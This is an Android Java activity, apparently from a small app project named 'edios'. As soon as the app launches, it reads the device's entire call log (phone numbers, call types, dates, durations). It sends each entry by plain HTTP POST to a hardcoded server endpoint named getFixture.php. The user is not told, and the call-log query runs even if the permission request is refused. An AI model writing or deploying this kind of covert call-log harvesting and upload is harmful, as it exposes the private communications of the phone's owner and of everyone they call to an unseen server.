package com.example.edios;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.CallLog;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.View;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class SendData extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    public String postReceiverUrl = "http://172.21.5.208/edios/getFixture.php";

    // HttpClient
    public HttpClient httpClient = new DefaultHttpClient();

    // post header
    private HttpPost httpPost;

    private List<NameValuePair> nameValuePairs = new ArrayList<>(2);
    public int REQUEST_CODE_TO_READ_CALL_LOGS = 1;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_send_data);
        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        //Log.v(TAG, "postURL: " + postReceiverUrl);
        FloatingActionButton fab = findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });
         httpPost = new HttpPost(postReceiverUrl);
        //getCallDetails(this);
        new PostDataAsyncTask().execute();
    }


    public class PostDataAsyncTask extends AsyncTask<String, String, String> {

        protected void onPreExecute() {
            super.onPreExecute();
            // do stuff before posting data
        }

        @Override
        protected String doInBackground(String... strings) {
            try {
                // 1 = post text data, 2 = post file
                int actionChoice = 1;
                // post a text data
                if(actionChoice==1){
                    getCallDetails(SendData.this);
                    //postText();
                }
                // post a file
                else{
                    //postFile();
                }
            } catch (NullPointerException e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onPostExecute(String lenghtOfFile) {
            // do stuff after posting data
        }
    }

    // this will post our text data
    private void postText(){
        try{
            // url where the data will be posted


            // add your data
            //nameValuePairs.add(new BasicNameValuePair("firstname", "Mike"));
            //nameValuePairs.add(new BasicNameValuePair("lastname", "Dalisay"));
            //nameValuePairs.add(new BasicNameValuePair("email", "mike@testmail.com"));

            httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

            // execute HTTP post request
            HttpResponse response = httpClient.execute(httpPost);
            HttpEntity resEntity = response.getEntity();

            if (resEntity != null) {

                String responseStr = EntityUtils.toString(resEntity).trim();
                Log.v(TAG, "Response: " +  responseStr);

                // you can add an if statement here and do other actions based on the response
            }

        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }




    private void getCallDetails(Context context) {
        StringBuffer stringBuffer = new StringBuffer();
        if ( ContextCompat.checkSelfPermission( this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED ) {
            ActivityCompat.requestPermissions( this, new String[] {  Manifest.permission.READ_CALL_LOG},REQUEST_CODE_TO_READ_CALL_LOGS);
        }
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        Log.v(TAG, "CallLogs: " + cursor.toString());

        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }


            //Putting The data in a Object for sending
            nameValuePairs.clear();
            nameValuePairs.add(new BasicNameValuePair("PhoneNumber", phNumber));
            nameValuePairs.add(new BasicNameValuePair("Type", callType));
            nameValuePairs.add(new BasicNameValuePair("Date", callDate));
            nameValuePairs.add(new BasicNameValuePair("Duration", callDuration));

            //Sending data
            postText();



            //String for Log purpose
            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            stringBuffer.append("\n----------------------------------");
        }
        cursor.close();
        Log.v(TAG, "CallLogs: " + stringBuffer.toString());
        //return stringBuffer.toString();
    }

}
